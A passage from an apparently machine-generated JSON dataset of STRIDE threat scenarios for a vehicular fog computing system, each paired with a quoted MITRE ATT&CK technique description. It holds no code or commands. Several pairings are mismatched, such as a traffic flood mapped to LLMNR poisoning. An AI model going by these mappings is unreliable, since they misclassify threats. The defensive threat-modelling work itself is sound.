an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized party intercepts data exchanged between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data packets are transmitted without encryption.",
                    "Role": "System Designer",
                    "Condition": "Communication occurs in plaintext or with weak encryption."
                },
                {
                    "Assumption": "The attacker has access to the network where data is transmitted.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within the communication range or has network access."
                },
                {
                    "Assumption": "Traditional security mechanisms like VPNs are not deployed.",
                    "Role": "Security Engineer",
                    "Condition": "There are no additional security measures to protect data in transit."
                }
            ],
            "Potential Impact": "Compromised confidentiality due to unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A misconfigured fog node exposes sensitive raw data to the public.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data storage practices are poorly managed.",
                    "Role": "System Architect",
                    "Condition": "Data is stored or transmitted without proper access controls."
                },
                {
                    "Assumption": "The fog node is accessible from the public internet without restriction.",
                    "Role": "Administrator",
                    "Condition": "Improperly secured or configured fog node has open access."
                },
                {
                    "Assumption": "There are no monitoring or alerts for unauthorized access.",
                    "Role": "Security Engineer",
                    "Condition": "Systems lack adequate logging and monitoring for data access."
                }
            ],
            "Potential Impact": "Unauthorized access to and exposure of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exposure",
                "public access",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service data leaks due to inadequate access controls and permissions management.",
            "Assumptions": [
                {
                    "Assumption": "Access controls in cloud services are not sufficiently restrictive.",
                    "Role": "System Architect",
                    "Condition": "Misconfiguration or inadequate policy enforcement for cloud services."
                },
                {
                    "Assumption": "The attacker can exploit misconfigured permissions.",
                    "Role": "Attacker",
                    "Condition": "Weaknesses in access controls allow unauthorized access."
                },
                {
                    "Assumption": "Sensitive data is stored without appropriate encryption.",
                    "Role": "Data Manager",
                    "Condition": "Data at rest in the cloud lacks encryption."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data due to mismanaged permissions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud data",
                "access control",
                "permissions exploitation"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods fog nodes with excessive traffic, overwhelming their processing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack rate limiting or traffic management mechanisms.",
                    "Role": "System Designer",
                    "Condition": "There are no limits on the amount of traffic that fog nodes can receive."
                },
                {
                    "Assumption": "The attacker has the capability to generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "The attacker can launch distributed denial-of-service (DDoS) attacks."
                },
                {
                    "Assumption": "Nodes do not have redundancy or failover mechanisms.",
                    "Role": "System Implementer",
                    "Condition": "Fault tolerance and load balancing features are not in place."
                }
            ],
            "Potential Impact": "Disruption in system availability and processing delays.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flood",
                "DDoS",
                "network"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware installed on a fog node consumes all system resources, making it unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have adequate malware protection.",
                    "Role": "Security Engineer",
                    "Condition": "Antivirus or anti-malware solutions are not implemented on fog nodes."
                },
                {
                    "Assumption": "The attacker has the capability to install or execute malicious software.",
                    "Role": "Attacker",
                    "Condition": "The attacker gains control to install malware on the fog node."
                },
                {
                    "Assumption": "Node monitoring does not detect unusual resource consumption.",
                    "Role": "System Monitor",
                    "Condition": "There is no monitoring for unusual behavior or resource usage."
                }
            ],
            "Potential Impact": "System availability compromised due to resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "system unresponsiveness"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A single point of failure in the communication network disrupts the entire VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Network design includes single points of failure without redundancy.",
                    "Role": "Network Architect",
                    "Condition": "Network lacks redundant or alternate communication paths."
                },
                {
                    "Assumption": "The attacker can target these vulnerable points.",
                    "Role": "Attacker",
                    "Condition": "The attacker identifies and exploits single points of failure."
                },
                {
                    "Assumption": "No failover mechanisms are in place for critical network components.",
                    "Role": "Network Administrator",
                    "Condition": "Critical components lack backup or failover systems."
                }
            ],
            "Potential Impact": "Whole system denial-of-service due to network disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network disruption",
                "single point of failure",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in fog node software to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Fog node software contains unpatched vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "There are known vulnerabilities that have not been addressed."
                },
                {
                    "Assumption": "The attacker can identify and exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker has the skills and tools to exploit vulnerabilities."
                },
                {
                    "Assumption": "No additional privilege escalation protection mechanisms are in place.",
                    "Role": "Security Engineer",
                    "Condition": "The environment lacks protections against privilege escalation."
                }
            ],
            "Potential Impact": "Compromised system integrity due to unauthorized administrative access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "administrative access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware presence in a smart vehicle elevates the attacker\u2019s privileges within the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles lack robust anti-malware defenses.",
                    "Role": "Security Engineer",
                    "Condition": "Vehicles are not equipped with adequate malware detection and prevention."
                },
                {
                    "Assumption": "The attacker can install or execute malware on the vehicle.",
                    "Role": "Attacker",
                    "Condition": "The attacker has a method to introduce and run malicious software."
                },
                {
                    "Assumption": "The VFC system does not detect or prevent privilege escalation.",
                    "Role": "System Monitor",
                    "Condition": "The system lacks mechanisms to protect against elevated privilege roles."
                }
            ],
            "Potential Impact": "System integrity and control compromised by elevated privileges in the VFC system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "malware",
                "privilege escalation",
                "system control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An adversary exploits configuration weaknesses in cloud services to escalate permissions.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have misconfigured access controls.",
                    "Role": "Cloud Administrator",
                    "Condition": "Permissions and access controls are not properly set up."
                },
                {
                    "Assumption": "Adversaries can identify and exploit these configuration flaws.",
                    "Role": "Attacker",
                    "Condition": "Adversaries possess the skills to exploit misconfigurations."
                },
                {
                    "Assumption": "No automated audits or reviews of access policies are conducted.",
                    "Role": "Security Auditor",
                    "Condition": "Access policies are not reviewed or audited regularly."
                }
            ],
            "Potential Impact": "Compromised data and system integrity due to unauthorized elevated access.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud configuration",
                "permission escalation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "19",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate smart vehicle to gain access to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can obtain or mimic vehicle credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials are either not strongly protected or can be guessed/phished."
                },
                {
                    "Assumption": "System relies on vehicle-based credentials for authentication.",
                    "Role": "System Architect",
                    "Condition": "Current authentication mechanisms do not verify the legitimacy beyond credentials."
                }
            ],
            "Potential Impact": "Unauthorized access to VFC system and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "vehicle",
                "credentials",
                "network"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a roadside unit (RSU) to inject malicious data into the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "RSU identifiers are not strongly validated.",
                    "Role": "System Architect",
                    "Condition": "No secure channel or weak validation mechanisms for RSU identification."
                },
                {
                    "Assumption": "Attackers have physical or remote access to deploy a rogue RSU.",
                    "Role": "Attacker",
                    "Condition": "Lack of secure physical or network infrastructure."
                }
            ],
            "Potential Impact": "Corruption of traffic management and malicious data propagation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "RSU",
                "data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their communication as coming from a legitimate fog node to communicate with the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Fog node credentials or identifiers can be intercepted or guessed.",
                    "Role": "Attacker",
                    "Condition": "Weak encryption or unsecured communication channels."
                },
                {
                    "Assumption": "System lacks mutual authentication between nodes and central services.",
                    "Role": "System Architect",
                    "Condition": "Current protocols do not verify both connection endpoints."
                }
            ],
            "Potential Impact": "Unauthorized manipulation of local data processing and alerts.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fog node",
                "network",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data being transmitted between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of transport layer security or encryption standards."
                },
                {
                    "Assumption": "Attacker has access to the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity or compromised network infrastructure."
                }
            ],
            "Potential Impact": "Integrity of vehicular data and decisions based on corrupted data are compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data transmission",
                "injection",
                "vehicle"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises a fog node to alter stored data used for decision-making.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have weak security protections such as lack of firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "Delayed or absent patch management processes."
                },
                {
                    "Assumption": "Attacker has local or remote access to fog node storage.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability in fog node security controls or physical access points."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to incorrect real-time processing and decision-making.",
